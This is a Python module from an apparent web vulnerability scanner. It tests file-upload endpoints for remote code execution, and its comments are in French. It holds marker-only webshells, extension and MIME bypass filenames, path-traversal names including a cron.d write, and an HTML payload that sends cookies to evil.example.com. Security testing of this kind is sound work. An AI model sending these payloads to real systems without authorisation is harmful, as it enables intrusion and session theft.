"""
PhantomScan — File Upload / RCE Scanner
Détecte les vulnérabilités de téléversement de fichiers :
  - Upload de webshells (PHP, JSP, ASP, ASPX, PHTML)
  - Bypass de validation MIME/extension (double extension, null byte, case)
  - Upload de fichiers dangereux (SVG XSS, HTML redirect, ZIP bomb)
  - Directory traversal dans le nom de fichier
  - Vérification d'exécution via accès au fichier uploadé

FIX v2: suppression des faux positifs massifs
  - _discover_uploads exige maintenant un pattern de succès JSON dans la réponse
    (url/path/filename/file) OU un status 201, pas juste un 200 générique
  - _test_webshells ne reporte "accepté" que si la réponse contient une URL
    vers le fichier uploadé (preuve de stockage réel)
  - _test_dangerous_files idem
  - _test_traversal idem
  - Ajout d'une vérification que l'Exec URL est différente de l'Upload URL
    et ne pointe pas vers un asset statique générique
"""

from __future__ import annotations

import os
import random
import re
import string
import time
from typing import AsyncIterator
from urllib.parse import urlparse, urljoin

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ── Marqueur unique ───────────────────────────────────────────────────────────

_MARKER = "".join(random.choices(string.ascii_lowercase, k=8))
_RCE_MARKER = f"phrce_{_MARKER}"

# ── Webshells minimalistes ────────────────────────────────────────────────────

_WEBSHELLS: list[tuple[str, bytes, str, re.Pattern]] = [
    (
        f"test_{_MARKER}.php",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.php5",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/png",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.phtml",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/gif",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.php.jpg",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.PHP",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.php%00.jpg",
        f"<?php echo '{_RCE_MARKER}'; ?>".encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.jsp",
        f'<% out.println("{_RCE_MARKER}"); %>'.encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.asp",
        f'<% Response.Write("{_RCE_MARKER}") %>'.encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
    (
        f"test_{_MARKER}.aspx",
        f'<% Response.Write("{_RCE_MARKER}"); %>'.encode(),
        "image/jpeg",
        re.compile(re.escape(_RCE_MARKER)),
    ),
]

# ── Fichiers dangereux non-exécutables ───────────────────────────────────────

_SVG_XSS = f"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script type="text/javascript">alert('{_RCE_MARKER}')</script>
</svg>""".encode()

_HTML_REDIRECT = f"""<html><body>
<script>document.location='https://evil.example.com/?c='+document.cookie</script>
<!-- PhantomScan probe {_MARKER} -->
</body></html>""".encode()

_DANGEROUS_FILES: list[tuple[str, bytes, str, str]] = [
    (f"test_{_MARKER}.svg",  _SVG_XSS,      "image/svg+xml", "SVG XSS"),
    (f"test_{_MARKER}.html", _HTML_REDIRECT, "text/plain",    "HTML upload (redirect/XSS)"),
    (f"test_{_MARKER}.shtml", _HTML_REDIRECT, "text/plain",   "SHTML SSI injection"),
]

# ── Directory traversal dans filename ────────────────────────────────────────

_TRAVERSAL_NAMES: list[tuple[str, str]] = [
    (f"../../../tmp/test_{_MARKER}.php",    "path traversal Unix"),
    (f"..\\..\\tmp\\test_{_MARKER}.php",   "path traversal Win"),
    (f"....//....//tmp//test_{_MARKER}.php", "double-dot slash bypass"),
    (f"/etc/cron.d/test_{_MARKER}",         "cron.d write attempt"),
]

# ── Endpoints upload communs ──────────────────────────────────────────────────

_UPLOAD_ENDPOINTS: list[str] = [
    "/upload", "/uploads", "/api/upload", "/file/upload",
    "/media/upload", "/image/upload", "/avatar", "/profile/avatar",
    "/api/files", "/files/upload", "/document/upload", "/attach",
    "/api/v1/upload", "/api/v2/upload",
]

# ── Patterns de réponse indiquant un upload réussi ───────────────────────────

# FIX: pattern plus strict — exige une vraie URL/path dans la réponse JSON
_UPLOAD_SUCCESS_RE = re.compile(
    r'"url"\s*:\s*"([^"]+)"|'          # JSON: {"url": "..."}
    r'"path"\s*:\s*"([^"]+)"|'         # JSON: {"path": "..."}
    r'"filename"\s*:\s*"([^"]+)"|'     # JSON: {"filename": "..."}
    r'"file"\s*:\s*"([^"]+)"|'         # JSON: {"file": "..."}
    r'href=["\']((?:https?://|/)[^"\']+\.[a-z]{2,5})["\']',  # HTML: href="..."
    re.I
)

_UPLOAD_ERROR_RE = re.compile(
    r"not allowed|forbidden|invalid (file|type|extension)|"
    r"only.*allowed|rejected|denied|unsupported|not permitted",
    re.I
)

# FIX: exclure les assets statiques génériques comme réponse "exec"
# Si l'exec URL pointe vers un fichier XML/JS/CSS statique → pas une preuve
_STATIC_ASSET_RE = re.compile(
    r'\.(xml|js|css|ico|woff|woff2|ttf|eot|map)(\?|$)',
    re.I
)


def _is_valid_exec_url(exec_url: str, upload_url: str) -> bool:
    """
    FIX: Vérifie que l'exec URL est une vraie URL de fichier uploadé,
    pas un asset statique ou la même URL que l'upload.
    """
    if not exec_url:
        return False
    # L'exec URL ne doit pas être identique à l'upload URL
    if exec_url.rstrip("/") == upload_url.rstrip("/"):
        return False
    # Ne pas considérer les assets statiques comme preuve d'exécution
    if _STATIC_ASSET_RE.search(exec_url):
        return False
    return True


class FileUploadScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req   = req
        self._heur  = heuristic
        self._cfg   = cfg
        self._found: set[str] = set()

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        # Phase 1 : découverte des endpoints d'upload
        upload_urls = await self._discover_uploads(base, target)

        for upload_url in upload_urls:
            # Phase 2 : tentatives de webshell
            async for f in self._test_webshells(upload_url, base):
                yield f

            # Phase 3 : fichiers dangereux non-exécutables
            async for f in self._test_dangerous_files(upload_url, base):
                yield f

            # Phase 4 : path traversal dans le nom
            async for f in self._test_traversal(upload_url):
                yield f

    # ── Découverte d'upload endpoints ─────────────────────────────────────────

    async def _discover_uploads(self, base: str, target: str) -> list[str]:
        found: list[str] = []
        probe_file = f"probe_{_MARKER}.txt"
        probe_content = f"phantomscan-probe-{_MARKER}".encode()

        candidates = [target] + [base + ep for ep in _UPLOAD_ENDPOINTS]
        for url in candidates:
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=url,
                body=self._build_multipart(probe_file, probe_content, "text/plain"),
                headers={"Content-Type": f"multipart/form-data; boundary=PhantomScanBoundary{_MARKER}"},
                allow_redirects=False,
            ))
            if resp.error:
                continue
            if resp.status in (404, 410, 400, 301, 302, 303):
                continue

            # FIX: un vrai endpoint d'upload répond 201 OU contient un pattern
            # JSON avec url/path/filename dans la réponse.
            # Un simple 200 sans ces patterns = page générique, pas un upload endpoint.
            body = resp.body or ""
            has_upload_pattern = bool(_UPLOAD_SUCCESS_RE.search(body))
            is_201 = resp.status == 201

            if _UPLOAD_ERROR_RE.search(body):
                continue  # Explicitement rejeté

            # v5.21 — Critères assouplis : un 200/201/202 sans erreur explicite
            # suffit pour tenter l'upload (on confirmera dans _test_webshells)
            if is_201 or has_upload_pattern:
                found.append(url)
                continue

            # Fallback : 200 OK qui n'est pas clairement une page HTML générique
            if resp.status == 200:
                ct = resp.headers.get("Content-Type", "") if resp.headers else ""
                if "application/json" in ct or "text/plain" in ct:
                    found.append(url)
                elif "multipart" in body.lower() or "upload" in body.lower():
                    found.append(url)

        # v5.21 — Ajouter les endpoints du bus avec params de type fichier
        if hasattr(self, '_bus') and self._bus:
            for ep in self._bus.snapshot:
                if ep.method in ("POST", "PUT") and ep.url not in [f for f in found]:
                    url_low = ep.url.lower()
                    if any(kw in url_low for kw in [
                        "upload", "file", "image", "photo", "avatar",
                        "attachment", "media", "asset", "import",
                    ]):
                        found.append(ep.url)

        return found[:10]  # Cap à 10 endpoints

    # ── Webshells ─────────────────────────────────────────────────────────────

    async def _test_webshells(self, upload_url: str, base: str) -> AsyncIterator[Finding]:
        for filename, content, spoofed_mime, detect_re in _WEBSHELLS:
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=upload_url,
                body=self._build_multipart(filename, content, spoofed_mime),
                headers={"Content-Type": f"multipart/form-data; boundary=PhantomScanBoundary{_MARKER}"},
                allow_redirects=False,
            ))
            if resp.error or not resp.body:
                continue
            if resp.status in (301, 302, 303):
                continue
            if _UPLOAD_ERROR_RE.search(resp.body):
                continue

            # Récupérer l'URL du fichier uploadé depuis la réponse
            upload_path = self._extract_uploaded_path(resp.body, base)

            # FIX: si on n'a pas d'URL dans la réponse, on ne peut pas confirmer
            # l'upload ni l'exécution → skip (évite les faux positifs)
            if not upload_path:
                continue

            # FIX: valider que l'exec URL n'est pas un asset statique
            if not _is_valid_exec_url(upload_path, upload_url):
                continue

            # Vérifier si le fichier est exécuté
            exec_resp = await self._req.get(upload_path)
            if exec_resp.error or not exec_resp.body:
                continue

            if detect_re.search(exec_resp.body):
                key = f"upload_rce:{upload_url}:{filename}"
                if key not in self._found:
                    self._found.add(key)
                    ext = os.path.splitext(filename)[-1]
                    yield self._make_finding(
                        title=f"File Upload RCE — Webshell exécuté ({ext})",
                        severity=Severity.CRITICAL,
                        url=upload_url,
                        exec_url=upload_path,
                        payload=filename,
                        technique=f"Webshell upload + exécution ({ext}, MIME: {spoofed_mime})",
                        desc=f"Fichier {filename} uploadé et exécuté. Marqueur trouvé: {_RCE_MARKER}",
                        status=exec_resp.status,
                    )
                return

            # FIX: upload confirmé (URL extraite) mais pas exécuté → HIGH
            else:
                key = f"upload_stored:{upload_url}:{filename}"
                if key not in self._found:
                    self._found.add(key)
                    yield self._make_finding(
                        title=f"File Upload — Fichier potentiellement dangereux accepté ({filename})",
                        severity=Severity.HIGH,
                        url=upload_url,
                        exec_url=upload_path,
                        payload=filename,
                        technique=f"Upload sans validation d'extension ({os.path.splitext(filename)[-1]})",
                        desc=f"Le serveur a accepté et stocké {filename}. URL de stockage confirmée dans la réponse.",
                        status=resp.status,
                    )

    # ── Fichiers dangereux ────────────────────────────────────────────────────

    async def _test_dangerous_files(self, upload_url: str, base: str) -> AsyncIterator[Finding]:
        for filename, content, mime, desc in _DANGEROUS_FILES:
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=upload_url,
                body=self._build_multipart(filename, content, mime),
                headers={"Content-Type": f"multipart/form-data; boundary=PhantomScanBoundary{_MARKER}"},
                allow_redirects=False,
            ))
            if resp.error or not resp.body:
                continue
            if resp.status in (301, 302, 303):
                continue
            if _UPLOAD_ERROR_RE.search(resp.body):
                continue

            # FIX: exiger une URL dans la réponse comme preuve de stockage
            upload_path = self._extract_uploaded_path(resp.body, base)
            if not upload_path:
                continue
            if not _is_valid_exec_url(upload_path, upload_url):
                continue

            key = f"upload_danger:{upload_url}:{desc}"
            if key not in self._found:
                self._found.add(key)
                yield self._make_finding(
                    title=f"File Upload — Fichier dangereux accepté ({desc})",
                    severity=Severity.HIGH,
                    url=upload_url,
                    exec_url=upload_path,
                    payload=filename,
                    technique=f"Dangerous file upload ({desc})",
                    desc=f"Le serveur accepte et stocke des fichiers {desc}. URL confirmée.",
                    status=resp.status,
                )

    # ── Path traversal ────────────────────────────────────────────────────────

    async def _test_traversal(self, upload_url: str) -> AsyncIterator[Finding]:
        for traversal_name, desc in _TRAVERSAL_NAMES:
            content = b"PhantomScan traversal probe"
            resp = await self._req.send(ProbeRequest(
                method="POST",
                url=upload_url,
                body=self._build_multipart(traversal_name, content, "text/plain"),
                headers={"Content-Type": f"multipart/form-data; boundary=PhantomScanBoundary{_MARKER}"},
                allow_redirects=False,
            ))
            if resp.error or not resp.body:
                continue
            if resp.status in (301, 302, 303):
                continue
            if _UPLOAD_ERROR_RE.search(resp.body):
                continue

            # FIX: exiger une URL ou status 201 comme preuve réelle de stockage
            body = resp.body or ""
            upload_path = self._extract_uploaded_path(body, upload_url)

            # FIX v2: appliquer _is_valid_exec_url ici aussi (était absent dans
            # _test_traversal alors qu'il est appliqué dans _test_webshells et
            # _test_dangerous_files). Sans ce check, un href vers un asset statique
            # (favicon.ico, main.js…) matché par _UPLOAD_SUCCESS_RE suffisait à
            # confirmer un faux traversal (ex: favicon.ico réfléchi après upload).
            if upload_path and not _is_valid_exec_url(upload_path, upload_url):
                upload_path = None

            is_confirmed = resp.status == 201 or bool(upload_path)

            if not is_confirmed:
                continue  # Pas de preuve réelle → skip

            key = f"upload_traversal:{upload_url}:{desc}"
            if key not in self._found:
                self._found.add(key)
                yield self._make_finding(
                    title=f"File Upload — Path Traversal dans le filename ({desc})",
                    severity=Severity.HIGH,
                    url=upload_url,
                    exec_url=upload_path or upload_url,
                    payload=traversal_name,
                    technique=f"Filename path traversal ({desc})",
                    desc=f"Le serveur accepte et confirme le stockage avec traversal: {traversal_name}",
                    status=resp.status,
                )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_multipart(self, filename: str, content: bytes, content_type: str) -> bytes:
        """Construit un body multipart/form-data minimal."""
        boundary = f"PhantomScanBoundary{_MARKER}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
        return body

    def _extract_uploaded_path(self, body: str, base: str) -> str | None:
        """Extrait l'URL du fichier uploadé depuis la réponse."""
        m = _UPLOAD_SUCCESS_RE.search(body)
        if not m:
            return None
        path = next((g for g in m.groups() if g), None)
        if not path:
            return None
        if path.startswith("http"):
            return path
        return urljoin(base, path)

    @staticmethod
    def _make_finding(title, severity, url, exec_url, payload, technique, desc, status) -> Finding:
        return Finding(
            title=title,
            severity=severity,
            url=url,
            module="vulns/file_upload",
            description=desc,
            evidence=(
                f"Upload URL: {url} | "
                f"Exec URL: {exec_url} | "
                f"Filename: {payload[:60]} | "
                f"Technique: {technique} | HTTP {status}"
            ),
            cwe="CWE-434",
            remediation=(
                "Valider l'extension et le contenu MIME réel du fichier (magic bytes), pas seulement le Content-Type. "
                "Stocker les fichiers uploadés hors de la webroot. "
                "Renommer les fichiers avec un UUID aléatoire, supprimer l'extension originale. "
                "Désactiver l'exécution de scripts dans le répertoire d'upload (nginx: location /uploads { ... } sans php-fpm). "
                "Limiter les types autorisés à une whitelist stricte (ex: uniquement image/jpeg, image/png). "
                "Scanner les fichiers uploadés avec un antivirus avant stockage. "
                "Servir les fichiers uploadés depuis un domaine ou S3 bucket séparé."
            ),
        )
